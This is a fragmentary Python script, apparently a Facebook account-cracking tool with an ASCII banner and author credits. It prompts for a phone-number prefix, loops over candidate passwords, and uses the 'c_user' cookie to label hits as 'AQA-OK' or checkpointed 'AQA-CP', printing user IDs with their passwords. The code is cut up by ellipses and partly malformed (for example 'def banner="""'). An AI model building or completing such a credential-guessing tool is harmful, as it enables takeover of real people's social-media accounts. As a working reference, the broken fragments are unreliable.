...
'''
this is an open source program by Mr. osama (osama-zamzam)
...
def banner="""(____  _   __      ______________  ______
  / __ \/ | / /     / ____/  _/ __ \/ ____/
 / / / /  |/ /_____/ /_   / // /_/ / __/   
...
\____/_/ |_/     /_/   /___/_/ |_/_____/   
	...
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. AQA                %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : LIBYA-1982               %s║"%(Z,B,Z))
	print("%s║%s  Telegram : 0912537778               %s║"%(Z,B,Z))
...
def random_number():
	...
	print(f" {M}FOR EXAMPLE : {Z}[{H}09137543XXXX{Z}]\n")
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [AQA-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [AQA-CP] '+uidx+' | '+pasw+'\033[0;97m')
